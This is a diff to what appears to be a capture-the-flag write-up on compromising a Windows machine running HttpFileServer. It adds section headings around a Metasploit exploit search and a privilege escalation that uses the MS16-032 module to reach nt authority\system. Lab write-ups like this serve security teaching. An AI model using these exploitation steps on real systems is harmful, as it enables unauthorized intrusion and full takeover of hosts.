@@ -33,7 +33,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu Sep 10 12:58:02 2020 -- 1 IP address (1 host up) scanned in 24.87 seconds
 ```
 
-Search service using metasploit:
+## Vulnerability analysis and exploitation
+Search for HttpFileServer exploits (from msfconsole):
 ```
 msf5 > search httpfileserver
 
@@ -127,6 +128,7 @@ optimum\kostas
 ```
 User flag is already accessible.
 
+## Privilege escalation
 Now, let's escalate privileges to get a system shell using the exploit `windows/local/ms16_032_secondary_logon_handle_privesc`:
 ```       
 msf5 > use windows/local/ms16_032_secondary_logon_handle_privesc                                             
@@ -218,4 +220,4 @@ whoami
 nt authority\system
 ```
 
-And that's it, the root flag will be available at `C:\Users\Administrator\Desktop`.
+And that's it, the root flag is be available at `C:\Users\Administrator\Desktop`.
